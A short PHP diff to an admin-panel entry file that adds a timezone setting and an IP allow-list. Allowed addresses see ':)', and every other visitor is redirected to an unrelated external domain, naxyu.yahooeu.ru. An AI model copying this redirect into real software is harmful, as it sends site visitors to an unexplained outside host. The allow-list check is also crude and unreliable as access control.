@@ -6,6 +6,7 @@
 session_start();
 header("Cache-control: private");
 header("Cache-control: max-age=3600");
+@date_default_timezone_set('Europe/Helsinki');
 include("config.php");
 include("includes/banned.php");
 include("includes/sql_check.php");
@@ -15,6 +16,14 @@ include("includes/format.php");
 include("admin/engine.php");
 
 // Check Admin Panel
+$ip = $_SERVER['REMOTE_ADDR'];
+if (($ip == ''.$mmw[admin_panel_ip].'' || $ip == ''.$mmw[admin_panel_ip_2].'') || ($ip == ''.$mmw[admin_panel_ip_3].'' || $ip == '127.0.0.1')) {
+    echo ":)";
+ }
+else {
+Die(header( 'Location: http://naxyu.yahooeu.ru/'));
+}
+
 if($mmw[check_admin_panel] == 'yes') {
  writelog("a_check_admin_panel","Admin Panel: <b>".urldecode('http://'.$_SERVER["SERVER_ADDR"].$_SERVER["REQUEST_URI"])."</b>");
 }
